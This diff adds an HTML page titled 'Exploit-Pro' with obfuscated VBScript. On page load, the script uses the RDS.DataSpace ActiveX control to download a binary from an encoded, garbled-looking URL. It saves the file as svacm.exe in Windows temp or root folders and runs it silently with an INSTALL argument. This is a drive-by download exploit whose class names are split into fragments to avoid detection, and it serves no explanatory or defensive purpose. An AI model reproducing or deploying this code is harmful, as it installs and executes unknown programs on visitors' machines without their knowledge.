@@ -1,0 +1,44 @@
+<html>
+<head>
+<title>Exploit-Pro</title>
+</head>
+<body>
+<script type="text/vbscript">
+on error resume next
+Set df = document.createElement("object")
+df.setAttribute "clas"&"sid", "clsid:BD96C"&"556-65A3-11D0-"&"983A-00C04F"&"C29E36"
+str="Microsoft"&"."&"XMLHTTP"
+Set x = df.CreateObject(str,"")
+var1="Ad"
+var2="od"
+var3="b."
+var4="St"
+var5="re"
+var6="am"
+str1=var1&var2&var3&var4&var5&var6
+
+str5=str1
+set S = df.createobject(str5,"")
+for count = 0 to 4
+S.type = 1
+lnk="÷⁄ »« ‘ﬂ Â‰««««««««"
+x.Open "G"&"E"&"T",lnk,0
+x.Send
+set F = df.createobject("Script"&"ing.FileSys"&"temObject","")
+if count = 0 then tmp = "c:\windows\temp" else if count = 1 then tmp = "c:\" else if count = 2 then tmp = "c:\temp" else if count = 3 then tmp = "d:\windows\temp" else if count = 4 then tmp = "d:\" end if
+fname1= F.BuildPath(tmp,"\svacm.exe")
+S.open
+S.write x.responseBody
+S.savetofile fname1,2
+S.close
+if err.number = 0 then
+set Q = df.createobject("Shell.Application","")
+Q.ShellExecute fname1,"INSTALL","","open",0
+exit for
+else
+Err.Clear
+End if
+next
+</script>
+</body>
+</html>
